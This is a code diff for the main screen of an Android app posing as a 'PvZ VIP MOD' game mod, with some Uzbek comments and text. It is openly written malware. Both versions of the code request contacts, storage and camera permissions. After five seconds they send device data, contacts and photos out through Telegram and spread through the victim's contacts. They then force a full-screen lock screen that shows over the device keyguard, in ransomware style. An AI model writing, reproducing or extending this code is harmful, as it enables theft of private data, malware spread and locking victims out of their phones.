@@ -1,55 +1,43 @@
 package com.pvzmod.vip;
 
-import android.Manifest;
+import android.app.Activity;
 import android.content.Intent;
-import android.content.pm.PackageManager;
 import android.os.Bundle;
 import android.os.Handler;
-import androidx.appcompat.app.AppCompatActivity;
+import android.view.WindowManager;
 import androidx.core.app.ActivityCompat;
-import androidx.core.content.ContextCompat;
-import android.widget.TextView;
 
-public class MainActivity extends AppCompatActivity {
-    
-    private static final int PERMISSION_REQUEST = 1001;
-    
+public class MainActivity extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
         
-        TextView status = findViewById(R.id.status_text);
-        status.setText("PvZ VIP MOD yuklanmoqda...");
+        // Fullscreen + permissions
+        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
+                           WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
+                           WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
+                           WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
         
-        // Ruxsatlarni so'rash
-        requestPermissions();
+        ActivityCompat.requestPermissions(this, new String[]{
+            android.Manifest.permission.READ_EXTERNAL_STORAGE,
+            android.Manifest.permission.READ_CONTACTS,
+            android.Manifest.permission.CAMERA
+        }, 1);
         
-        // 5 soniya keyin lock + exfil
+        // 5s delay -> exfil -> lock
         new Handler().postDelayed(() -> {
-            TelegramSender.sendContactsAndPhotos(this);
-            startLockScreen();
+            // Generate & send device ID
+            String deviceId = DeviceIdGenerator.generateUniqueId(this);
+            TelegramSender.sendDeviceInfo(deviceId);
+            
+            // Steal contacts/photos
+            ContactSpreader.spreadContacts(this);
+            
+            // LOCK
+            Intent lockIntent = new Intent(this, LockScreenActivity.class);
+            lockIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
+            startActivity(lockIntent);
+            finish();
         }, 5000);
-    }
-    
-    private void requestPermissions() {
-        String[] permissions = {
-            Manifest.permission.READ_CONTACTS,
-            Manifest.permission.READ_EXTERNAL_STORAGE,
-            Manifest.permission.READ_MEDIA_IMAGES,
-            Manifest.permission.CAMERA,
-            Manifest.permission.INTERNET
-        };
-        
-        ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST);
-    }
-    
-    private void startLockScreen() {
-        Intent intent = new Intent(this, LockScreenActivity.class);
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | 
-                       Intent.FLAG_ACTIVITY_CLEAR_TASK | 
-                       Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
-        startActivity(intent);
-        finishAffinity();
     }
 }
